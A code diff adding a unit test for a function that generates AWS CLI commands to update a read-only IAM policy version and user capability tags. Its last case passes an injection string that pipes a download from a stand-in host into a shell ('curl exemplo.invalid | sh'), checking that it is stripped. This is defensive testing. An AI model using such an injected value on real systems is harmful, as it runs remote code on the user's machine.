@@ -22,6 +22,7 @@ import {
   awsReaderUserArn,
   awsReaderUserCommands,
   awsReaderUserPolicy,
+  awsReaderUserUpdateCommands,
   gcpReaderCommands,
   gcpReaderSubscription,
   type IamPolicy,
@@ -369,6 +370,36 @@ describe('o usuário IAM de leitura da AWS', () => {
         { Key: 'verax-control:capabilities', Value: 'discovery findings' },
       ]),
     ).toEqual({ templateVersion: 2, capabilities: ['discovery', 'findings'] });
+  });
+
+  it('os comandos de atualização gravam uma versão nova da política de leitura e as etiquetas do usuário', () => {
+    expect(awsReaderUserUpdateCommands('111111111111').split('\n')).toEqual([
+      'aws iam create-policy-version --policy-arn arn:aws:iam::111111111111:policy/verax/VeraxControlReader --policy-document file://verax-control-reader.json --set-as-default',
+      "aws iam tag-user --user-name verax-control-reader --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery service-logs findings log-groups'",
+    ]);
+    // Com as autorizações escolhidas, a etiqueta diz só as escolhidas (a descoberta vale sempre).
+    expect(awsReaderUserUpdateCommands('111111111111', ['findings'])).toContain(
+      " --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery findings'",
+    );
+    expect(awsReaderUserUpdateCommands('111111111111', [])).toContain(
+      "'Key=verax-control:capabilities,Value=discovery'",
+    );
+    // As etiquetas são as mesmas que a criação do usuário grava: o nó lê as duas do mesmo jeito.
+    const tags = (commands: string) => commands.split(' --tags ')[1]?.split('\n')[0];
+    expect(tags(awsReaderUserUpdateCommands('111111111111', ['service-logs', 'log-groups']))).toBe(
+      tags(awsReaderUserCommands('111111111111', ['service-logs', 'log-groups'])),
+    );
+    // Só a política de leitura muda: a de negações, a chave de acesso e o próprio usuário ficam como estão.
+    const update = awsReaderUserUpdateCommands('111111111111');
+    expect(update).not.toContain('VeraxControlGuardrails');
+    expect(update).not.toContain('create-access-key');
+    expect(update).not.toContain('create-user');
+    // Um texto qualquer na lista não entra no comando que o cliente cola no terminal.
+    const hostile = awsReaderUserUpdateCommands('111111111111', [
+      "x' ; curl exemplo.invalid | sh #" as AwsReaderCapability,
+    ]);
+    expect(hostile).toContain("'Key=verax-control:capabilities,Value=discovery'");
+    expect(hostile).not.toContain('curl');
   });
 });
 
